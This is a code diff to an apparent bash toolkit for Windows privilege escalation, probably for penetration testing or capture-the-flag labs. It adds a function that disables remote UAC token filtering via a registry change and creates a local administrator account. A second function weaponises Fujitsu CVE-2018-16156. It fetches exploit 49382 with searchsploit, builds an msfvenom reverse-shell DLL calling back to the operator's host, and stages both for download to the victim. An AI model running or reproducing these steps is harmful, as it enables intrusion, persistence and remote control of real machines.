@@ -202,6 +202,12 @@ netuser_add_admin_user_to_administrators() {
     echo "$cmd"
 }
 
+netuser_add_admin() {
+    echo 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
+    netuser_create_admin_user
+    netuser_add_admin_user_to_administrators
+}
+
 netuser_change_user_password() {
     local username="$1"
     local password="$2"
@@ -306,4 +312,24 @@ perform_local_potato() {
         cmd=$(get_powershell_interactive_shell)
     fi
     echo ".\LocalPotato.exe \"$cmd\""
+}
+
+#fujitsu cve-2018-16156
+perform_cve_2018_16156() {
+    echo "Exploit for Fujitsu CVE-2018-16156"
+    local cve_dir="CVE-2018-16156"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || return 1
+    if [[ ! -f 49382.ps1 ]]; then
+        searchsploit -m 49382
+    fi
+    msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=$host_ip LPORT=$host_port
+    generate_windows_download "$cve_dir/49382.ps1" "49382.ps1"
+    generate_windows_download "$cve_dir/UninOldIS.dll" "UninOldIS.dll"
+    popd || return 1
+    zip -r $cve_dir.zip $cve_dir
+    generate_windows_download "$cve_dir.zip"
+
 }
